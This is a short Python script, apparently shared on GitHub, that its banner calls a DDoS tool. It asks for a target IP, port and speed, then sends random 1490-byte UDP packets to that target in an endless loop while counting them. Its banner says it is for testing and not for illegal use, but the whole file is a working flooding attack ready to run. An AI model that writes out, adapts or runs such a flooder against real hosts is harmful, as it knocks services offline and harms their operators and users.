"""
========================================
Name:DDos.2.5  Author: Lalevin Martin
 Mailbox: zzlyxht@outlook.com                                                
 Github: http://github.com/nacglalevin
Written in 2023-12-17
==================NACG==================
"""
# python3

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDOS NACG")
text="""
=========================================================================                                                                 
 DDos python script | Script used for testing ddos | Ddos attack     
 Author: Lalevin Martin
 Mailbox: zzlyxht@outlook.com                                                
 Github: http://github.com/nacglalevin                          
 Version:2.5
==================================NACG===================================
"""
print (" ")
print(text)                          
print (" ")
print (" -----------------[Do not use for illegal purposes]----------------- ")
print (" ")
ip = input("请输入 IP     : ")
port = int(input("攻击端口      : "))
sd = int(input("攻击速度(1~1000) : "))

os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)
